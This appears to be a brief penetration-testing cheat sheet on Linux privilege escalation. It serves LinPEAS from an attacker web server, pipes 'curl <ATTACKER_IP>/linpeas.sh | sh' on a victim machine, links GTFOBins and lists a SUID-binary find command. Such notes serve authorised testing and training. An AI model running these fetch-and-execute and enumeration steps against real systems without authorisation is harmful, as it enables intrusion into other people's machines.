---
description: Tools and methodology for Linux PrivEsc
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Linux

## LinPEAS - Linux Privilege Escalation Awesome Script

When escalating privileges, one of the **fastest** ways to transfer and execute an enumeration script like `linpeas.sh` is using Python’s built-in HTTP server combined with `curl`.

***

#### &#x20;**Attacker: Start a Simple Web Server**

Run the following command on your **attacking machine** to serve files from the current directory:

```bash
python3 -m http.server 80
```

#### &#x20;**Victim: Download & Execute LinPEAS**

On the **target machine**, download and execute LinPEAS in one step:

```bash
curl <ATTACKER_IP>/linpeas.sh | sh
```

## GTFOBins

{% embed url="https://gtfobins.github.io/" %}

### Find potentially vulnerable SUID binaries

find / -type f -perm -4000 -user root 2>/dev/null
